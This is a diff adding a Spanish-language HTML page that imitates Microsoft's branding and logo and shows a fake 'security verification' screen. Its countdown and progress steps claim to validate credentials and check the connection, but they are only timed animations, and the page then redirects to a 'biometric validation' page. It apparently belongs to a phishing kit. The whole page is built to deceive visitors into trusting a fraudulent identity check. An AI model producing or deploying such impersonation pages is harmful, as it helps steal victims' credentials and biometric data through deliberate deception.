@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificando seguridad...</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        .loader-wrapper {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            padding: 40px 20px;
+        }
+
+        .spinner {
+            width: 80px;
+            height: 80px;
+            position: relative;
+            margin-bottom: 30px;
+        }
+
+        .spinner::before,
+        .spinner::after {
+            content: '';
+            position: absolute;
+            border-radius: 50%;
+            border: 4px solid transparent;
+            animation: spin 1.4s linear infinite;
+        }
+
+        .spinner::before {
+            inset: 0;
+            border-top-color: #f25022;
+            border-right-color: #7fba00;
+            border-bottom-color: #00a4ef;
+            border-left-color: #ffb900;
+        }
+
+        .spinner::after {
+            inset: 12px;
+            border-top-color: #00a4ef;
+            border-right-color: #ffb900;
+            border-bottom-color: #f25022;
+            border-left-color: #7fba00;
+            animation-direction: reverse;
+            animation-duration: 1s;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .loading-title {
+            font-size: 20px;
+            font-weight: 600;
+            color: #1b1b1b;
+            margin-bottom: 8px;
+            text-align: center;
+        }
+
+        .loading-sub {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 30px;
+            text-align: center;
+        }
+
+        .progress-container {
+            width: 100%;
+            max-width: 320px;
+            margin: 0 auto 12px;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: #e0e0e0;
+            border-radius: 3px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #0078d4, #00a4ef);
+            border-radius: 3px;
+            transition: width 0.1s linear;
+        }
+
+        .timer {
+            font-size: 14px;
+            color: #444;
+            text-align: center;
+        }
+
+        .timer span {
+            font-weight: 600;
+            color: #0078d4;
+        }
+
+        .steps {
+            margin-top: 30px;
+            font-size: 13px;
+            color: #666;
+            text-align: left;
+            max-width: 320px;
+            width: 100%;
+        }
+
+        .steps .step {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 6px 0;
+            opacity: 0.4;
+            transition: opacity 0.3s, color 0.3s;
+        }
+
+        .steps .step.active {
+            opacity: 1;
+            color: #0078d4;
+            font-weight: 600;
+        }
+
+        .steps .step.done {
+            opacity: 1;
+            color: #107c10;
+        }
+
+        .steps .step .check {
+            display: inline-block;
+            width: 16px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="tod">
+        <div class="header">
+            <div class="logo">
+                <div class="square red"></div>
+                <div class="square green"></div>
+                <div class="square blue"></div>
+                <div class="square yellow"></div>
+            </div>
+            <span class="brand">Microsoft</span>
+        </div>
+
+        <div class="loader-wrapper">
+            <div class="spinner"></div>
+
+            <div class="loading-title">Verificando seguridad</div>
+            <div class="loading-sub">Estamos preparando la verificación de identidad...</div>
+
+            <div class="progress-container">
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progress-fill"></div>
+                </div>
+            </div>
+
+            <div class="timer">
+                Redirigiendo en <span id="seconds">10</span>s
+            </div>
+
+            <div class="steps">
+                <div class="step active" id="step1">
+                    <span class="check">◉</span> Validando credenciales...
+                </div>
+                <div class="step" id="step2">
+                    <span class="check">○</span> Comprobando conexión segura...
+                </div>
+                <div class="step" id="step3">
+                    <span class="check">○</span> Preparando verificación biométrica...
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const TOTAL_SEGUNDOS = 10;
+        let restante = TOTAL_SEGUNDOS;
+
+        const progressFill = document.getElementById('progress-fill');
+        const secondsEl    = document.getElementById('seconds');
+        const step1 = document.getElementById('step1');
+        const step2 = document.getElementById('step2');
+        const step3 = document.getElementById('step3');
+
+        function marcarDone(step) {
+            step.classList.remove('active');
+            step.classList.add('done');
+            step.querySelector('.check').textContent = '✓';
+        }
+
+        function marcarActive(step) {
+            step.classList.add('active');
+        }
+
+        function actualizar() {
+            const porcentaje = ((TOTAL_SEGUNDOS - restante) / TOTAL_SEGUNDOS) * 100;
+            progressFill.style.width = porcentaje + '%';
+            secondsEl.textContent = restante;
+
+            if (restante <= 7 && restante > 4) {
+                marcarDone(step1);
+                marcarActive(step2);
+            } else if (restante <= 4 && restante > 1) {
+                marcarDone(step1);
+                marcarDone(step2);
+                marcarActive(step3);
+            } else if (restante <= 1) {
+                marcarDone(step1);
+                marcarDone(step2);
+                marcarDone(step3);
+            }
+        }
+
+        actualizar();
+
+        const intervalo = setInterval(() => {
+            restante--;
+            if (restante <= 0) {
+                clearInterval(intervalo);
+                progressFill.style.width = '100%';
+                secondsEl.textContent = '0';
+                // Redirigir a la verificación biométrica
+                window.location.href = 'Validación Biométrica.html';
+                return;
+            }
+            actualizar();
+        }, 1000);
+    </script>
+</body>
+</html>
